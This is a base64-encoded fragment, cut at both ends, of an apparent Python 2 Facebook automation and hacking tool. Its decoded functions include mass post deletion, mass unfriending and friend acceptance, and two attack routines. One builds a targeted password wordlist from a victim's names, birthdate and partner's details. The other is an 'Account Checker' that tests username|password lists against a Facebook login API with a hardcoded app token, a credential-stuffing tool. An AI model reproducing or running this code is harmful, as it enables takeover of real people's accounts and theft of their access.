nN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICAgIG5hbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgICBsb2wgPSBqc29uLmxvYWRzKG5hbS50ZXh0KQogICAgbmFtYSA9IGxvbFsnbmFtZSddCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIHByaW50KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gcm9tIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlbmFtYSkKICBqYWxhbigiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU3RhcnRcMDMzWzE7OTdtIC4uLiIpCiAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgYXN1ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mZWVkP2FjY2Vzc190b2tlbj0nK3Rva2V0KQogIGFzdXMgPSBqc29uLmxvYWRzKGFzdS50ZXh0KQogIGZvciBwIGluIGFzdXNbJ2RhdGEnXToKICAgIGlkID0gcFsnaWQnXQogICAgcGlybyA9IDAKICAgIHVybCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZCsnP21ldGhvZD1kZWxldGUmYWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgICBvayA9IGpzb24ubG9hZHModXJsLnRleHQpCiAgICB0cnk6CiAgICAgIGVycm9yID0gb2tbJ2Vycm9yJ11bJ21lc3NhZ2UnXQogICAgICBwcmludCAnXDAzM1sxOzkxbVtcMDMzWzE7OTdtJytpZFs6MTBdLnJlcGxhY2UoJ1xuJywnICcpKycuLi4nKydcMDMzWzE7OTFtXSBcMDMzWzE7OTVtRmFpbGVkJwogICAgZXhjZXB0IFR5cGVFcnJvcjoKICAgICAgcHJpbnQgJ1wwMzNbMTs5Mm1bXDAzM1sxOzk3bScraWRbOjEwXS5yZXBsYWNlKCdcbicsJyAnKSsnLi4uJysnXDAzM1sxOzkybV0gXDAzM1sxOzk2bURlbGV0ZWQnCiAgICAgIHBpcm8gKz0gMQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICBwcmludCJcMDMzWzE7OTFtWyFdIENvbm5lY3Rpb24gRXJyb3IiCiAgICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICAgIG1lbnVfYm90KCkKICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICBwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Eb25lIgogIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgbWVudV9ib3QoKQogIAojIyMjIyBBQ0NFUFQgRlJJRU5EICMjIyMjCmRlZiBhY2NlcHQoKToKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIGxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRyZXF1ZXN0cz9saW1pdD0nK2xpbWl0KycmYWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgdGVtYW4gPSBqc29uLmxvYWRzKHIudGV4dCkKICBpZiAnW10nIGluIHN0cih0ZW1hblsnZGF0YSddKToKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gTm8gZnJpZW5kIHJlcXVlc3QiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbWVudV9ib3QoKQogIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQogIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogIGZvciBpIGluIHRlbWFuWydkYXRhJ106CiAgICBnYXMgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzLycraVsnZnJvbSddWydpZCddKyc/YWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgICBhID0ganNvbi5sb2FkcyhnYXMudGV4dCkKICAgIGlmICdlcnJvcicgaW4gc3RyKGEpOgogICAgICBwcmludCAiXDAzM1sxOzk3bVsgXDAzM1sxOzkxbUZhaWxlZFwwMzNbMTs5N20gXSAiK2lbJ2Zyb20nXVsnbmFtZSddCiAgICBlbHNlOgogICAgICBwcmludCAiXDAzM1sxOzk3bVsgXDAzM1sxOzkybUFjY2VwdFwwMzNbMTs5N20gXSAiK2lbJ2Zyb20nXVsnbmFtZSddCiAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRG9uZSIKICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogIG1lbnVfYm90KCkKICAKIyMjIyMgVU5GUklFTkQgIyMjIwpkZWYgdW5mcmllbmQoKToKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQogIHByaW50ICJcMDMzWzE7OTdtU3RvcCBcMDMzWzE7OTFtQ1RSTCtDIgogIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogIHRyeToKICAgIHBlayA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKICAgIGNvayA9IGpzb24ubG9hZHMocGVrLnRleHQpCiAgICBmb3IgaSBpbiBjb2tbJ2RhdGEnXToKICAgICAgbmFtYSA9IGlbJ25hbWUnXQogICAgICBpZCA9IGlbJ2lkJ10KICAgICAgcmVxdWVzdHMuZGVsZXRlKCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP3VpZD0iK2lkKyImYWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICAgIHByaW50ICJcMDMzWzE7OTdtW1wwMzNbMTs5Mm0gRGVsZXRlZCBcMDMzWzE7OTdtXSAiK25hbWEKICBleGNlcHQgSW5kZXhFcnJvcjogcGFzcwogIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbWVudV9ib3QoKQogIHByaW50IlxuXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRG9uZSIKICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogIG1lbnVfYm90KCkKICAKIyMjIyBMQUlOIExBSU4gIyMjIyMKIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMKIyMjI01FTlUgTEFJTiMjIyMjCmRlZiBsYWluKCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIG9zLnN5c3RlbSgncmVzZXQnKQogIHByaW50IGxvZ28KICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEuXDAzM1sxOzk3bSBDcmVhdGUgUG9zdCIKICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBDcmVhdGUgV29yZGxpc3QiCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLlwwMzNbMTs5N20gQWNjb3VudCBDaGVja2VyIgogIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIFNlZSBteSBncm91cCBsaXN0IgogIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNS5cMDMzWzE7OTdtIFByb2ZpbGUgR3VhcmQiCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKICBwcmludCAi4pWRIgogIHBpbGloX2xhaW4oKQojLy8vLy8vLy8vLy8vCmRlZiBwaWxpaF9sYWluKCk6CiAgb3RoZXIgPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikKICBpZiBvdGhlciA9PSIiOgogICAgcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCiAgICBwaWxpaF9sYWluKCkKICBlbGlmIG90aGVyID09IjEiOgogICAgc3RhdHVzKCkKICBlbGlmIG90aGVyID09IjIiOgogICAgd29yZGxpc3QoKQogIGVsaWYgb3RoZXIgPT0iMyI6CiAgICBjaGVja19ha3VuKCkKICBlbGlmIG90aGVyID09IjQiOgogICAgZ3J1cHNheWEoKQogIGVsaWYgb3RoZXIgPT0iNSI6CiAgICBndWFyZCgpCiAgZWxpZiBvdGhlciA9PSIwIjoKICAgIG1lbnUoKQogIGVsc2U6CiAgICBwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKICAgIHBpbGloX2xhaW4oKQogICAgCiMjIyMjIFNUQVRVUyAjIyMjIwpkZWYgc3RhdHVzKCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIG9zLnN5c3RlbSgncmVzZXQnKQogIHByaW50IGxvZ28KICBtc2c9cmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1UeXBlIHN0YXR1cyBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKICBpZiBtc2cgPT0gIiI6CiAgICBwcmludCAiXDAzM1sxOzkxbVshXSBEb24ndCBiZSBlbXB0eSIKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBsYWluKCkKICBlbHNlOgogICAgcmVzID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mZWVkP21ldGhvZD1QT1NUJm1lc3NhZ2U9Iittc2crIiZhY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgIG9wID0ganNvbi5sb2FkcyhyZXMudGV4dCkKICAgIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUNyZWF0ZSBcMDMzWzE7OTdtLi4uJykKICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU3RhdHVzIElEXDAzM1sxOzkxbSA6IFwwMzNbMTs5N20iK29wWydpZCddCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbGFpbigpCiAgICAKIyMjIyMjIyMjIyMgQ1JFQVRFIFdPUkRMSVNUICMjIyMjIyMjIyMKZGVmIHdvcmRsaXN0KCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIHRyeToKICAgIG9zLnN5c3RlbSgncmVzZXQnKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkybUZpbGwgaW4gdGhlIGNvbXBsZXRlIGRhdGEgb2YgdGhlIHRhcmdldCBiZWxvdyIKICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgYSA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtTmFtYSBEZXBhbiBcMDMzWzE7OTdtOiAiKQogICAgZmlsZSA9IG9wZW4oYSsiLnR4dCIsICd3JykKICAgIGI9cmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1OYW1hIFRlbmdhaCBcMDMzWzE7OTdtOiAiKQogICAgYz1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybU5hbWEgQmVsYWthbmcgXDAzM1sxOzk3bTogIikKICAgIGQ9cmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1OYW1hIFBhbmdnaWxhbiBcMDMzWzE7OTdtOiAiKQogICAgZT1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRhbmdnYWwgTGFoaXIgPlwwMzNbMTs5Nm1leDogfERETU1ZWXwgXDAzM1sxOzk3bTogIikKICAgIGY9ZVswOjJdCiAgICBnPWVbMjo0XQogICAgaD1lWzQ6XQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBwcmludCgiXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTNtS2FsbyBKb21ibG8gU0tJUCBhamEgOnYiKQogICAgaT1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybU5hbWEgUGFjYXIgXDAzM1sxOzk3bTogIikKICAgIGo9cmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1OYW1hIFBhbmdnaWxhbiBQYWNhciBcMDMzWzE7OTdtOiAiKQogICAgaz1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRhbmdnYWwgTGFoaXIgUGFjYXIgPlwwMzNbMTs5Nm1leDogfERETU1ZWXwgXDAzM1sxOzk3bTogIikKICAgIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUNyZWF0ZSBcMDMzWzE7OTdtLi4uJykKICAgIGw9a1swOjJdCiAgICBtPWtbMjo0XQogICAgbj1rWzQ6XQogICAgZmlsZS53cml0ZSgiJXMlc1xuJXMlcyVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlcyIgJSAoYSxjLGEsYixiLGEsYixjLGMsYSxjLGIsYSxhLGIsYixjLGMsYSxkLGIsZCxjLGQsZCxkLGQsYSxkLGIsZCxjLGEsZSxhLGYsYSxnLGEsaCxiLGUsYixmLGIsZyxiLGgsYyxlLGMsZixjLGcsYyxoLGQsZSxkLGYsZCxnLGQsaCxlLGEsZixhLGcsYSxoLGEsZSxiLGYsYixnLGIsaCxiLGUsYyxmLGMsZyxjLGgsYyxlLGQsZixkLGcsZCxoLGQsZCxkLGEsZixnLGEsZyxoLGYsZyxmLGgsZixmLGcsZixnLGgsZyxnLGgsZixoLGcsaCxoLGgsZyxmLGEsZyxoLGIsZixnLGIsZyxoLGMsZixnLGMsZyxoLGQsZixnLGQsZyxoLGEsaSxhLGosYSxrLGksZSxpLGosaSxrLGIsaSxiLGosYixrLGMsaSxjLGosYyxrLGUsayxqLGEsaixiLGosYyxqLGQsaixqLGssYSxrLGIsayxjLGssZCxrLGssaSxsLGksbSxpLG4saixsLGosbSxqLG4saixrKSkKICAgIHdnID0gMAogICAgd2hpbGUgKHdnIDwgMTAwKToKICAgICAgd2cgPSB3ZyArIDEKICAgICAgZmlsZS53cml0ZShhICsgc3RyKHdnKSArICdcbicpCiAgICBlbiA9IDAKICAgIHdoaWxlIChlbiA8IDEwMCk6CiAgICAgIGVuID0gZW4gKyAxCiAgICAgIGZpbGUud3JpdGUoaSArIHN0cihlbikgKyAnXG4nKQogICAgd29yZCA9IDAKICAgIHdoaWxlICh3b3JkIDwgMTAwKToKICAgICAgd29yZCA9IHdvcmQgKyAxCiAgICAgIGZpbGUud3JpdGUoZCArIHN0cih3b3JkKSArICdcbicpCiAgICBnZW4gPSAwCiAgICB3aGlsZSAoZ2VuIDwgMTAwKToKICAgICAgZ2VuID0gZ2VuICsgMQogICAgICBmaWxlLndyaXRlKGogKyBzdHIoZ2VuKSArICdcbicpCiAgICBmaWxlLmNsb3NlKCkKICAgIHRpbWUuc2xlZXAoMS41KQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBwcmludCAoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N20gJXMudHh0IiAlYSkKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBsYWluKCkKICBleGNlcHQgSU9FcnJvciwgZToKICAgIHByaW50KCJcMDMzWzE7OTFtWyFdIEZhaWxlZCIpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbGFpbigpCgojIyMjIyBDSEVDS0VSICMjIyMjCmRlZiBjaGVja19ha3VuKCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIG9zLnN5c3RlbSgncmVzZXQnKQogIHByaW50IGxvZ28KICBwcmludCAiXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtQ3JlYXRlIGluIGZpbGVcMDMzWzE7OTFtIDogXDAzM1sxOzk3bXVzZXJuYW1lfHBhc3N3b3JkIgogIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogIGxpdmUgPSBbXQogIGNlayA9IFtdCiAgZGllID0gW10KICB0cnk6CiAgICBmaWxlID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHBhdGggXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCiAgICBsaXN0ID0gb3BlbihmaWxlLCdyJykucmVhZGxpbmVzKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50ICgiXDAzM1sxOzkxbVshXSBGaWxlIG5vdCBmb3VuZCIpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbGFpbigpCiAgcGVtaXNhaCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2VwYXJhdG9yIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiKQogIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQogIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogIGZvciBtZWtpIGluIGxpc3Q6CiAgICB1c2VybmFtZSwgcGFzc3dvcmQgPSAobWVraS5zdHJpcCgpKS5zcGxpdChzdHIocGVtaXNhaCkpCiAgICB1cmwgPSAiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXJuYW1lKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzd29yZCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIKICAgIGRhdGEgPSByZXF1ZXN0cy5nZXQodXJsKQogICAgbXBzaCA9IGpzb24ubG9hZHMoZGF0YS50ZXh0KQogICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gbXBzaDoKICAgICAgbGl2ZS5hcHBlbmQocGFzc3dvcmQpCiAgICAgIHByaW50IlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1MaXZlXDAzM1sxOzk3bSBdIFwwMzNbMTs5N20iK3VzZXJuYW1lKyJ8IitwYXNzd29yZAogICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gbXBzaFsiZXJyb3JfbXNnIl06CiAgICAgIGNlay5hcHBlbmQocGFzc3dvcmQpCiAgICAgIHByaW50IlwwMzNbMTs5N21bIFwwMzNbMTs5M21DaGVja1wwMzNbMTs5N20gXSBcMDMzWzE7OTdtIit1c2VybmFtZSsifCIrcGFzc3dvcmQKICAgIGVsc2U6CiAgICAgIGRpZS5hcHBlbmQocGFzc3dvcmQpCiAgICAgIHByaW50IlwwMzNbMTs5N21bIFwwMzNbMTs5MW1EaWVcMDMzWzE7OTdtIF0gXDAzM1sxOzk3bSIrdXNlcm5hbWUrInwiK3Bhc3N3b3JkCiAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWxcMDMzWzE7OTFtIDogXDAzM1sxOzk3bUxpdmU9XDAzM1sxOzkybSIrc3RyKGxlbihsaXZlKSkrIiBcMDMzWzE7OTdtQ2hlY2s9XDAzM1sxOzkzbSIrc3RyKGxlbihjZWspKSsiIFwwMzNbMTs5N21EaWU9XDAzM1sxOzkxbSIrc3RyKGxlbihkaWUpKQogIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgbGFpbigpCiAgCiMjIyMjIEdSVVAgU0FZQSAjIyMjIwpkZWYgZ3J1cHNheWEoKToKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgdHJ5OgogICAgb3MubWtkaXIoJ291dCcpCiAgZXhjZXB0IE9TRXJyb3I6CiAgICBwYXNzCiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIHRyeToKICAgIHVoID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9ncm91cHM/YWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgICBndWQgPSBqc29uLmxvYWRzKHVoLnRleHQpCiAgICBmb3IgcCBpbiBndWRbJ2RhdGEnXToKICAgICAgbmFtYSA9IHBbIm5hbWUiXQogICAgICBpZCA9IHBbImlkIl0KICAgICAgZj1vcGVuKCdvdXQvR3J1cGlkLnR4dCcsJ3cnKQogICAgICBsaXN0Z3J1cC5hcHBlbmQoaWQpCiAgICAgIGYud3JpdGUoaWQgKyAnXG4nKQogICAgICBwcmludCAiXDAzM1sxOzk3bVsgXDAzM1sxOzkybU15R3JvdXBcMDMzWzE7OTdtIF0gIitzdHIoaWQpKyIgPT4gIitzdHIobmFtYSkKICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgR3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICVzIiUobGVuKGxpc3RncnVwKSkKICAgIHByaW50KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0L0dydXBpZC50eHQiKQogICAgZi5jbG9zZSgpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbGFpbigpCiAgZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CiAgICBwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBsYWluKCkKICBleGNlcHQgS2V5RXJyb3I6CiAgICBvcy5yZW1vdmUoJ291dC9HcnVwaWQudHh0JykKICAgIHByaW50KCdcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCcpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbGFpbigpCiAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5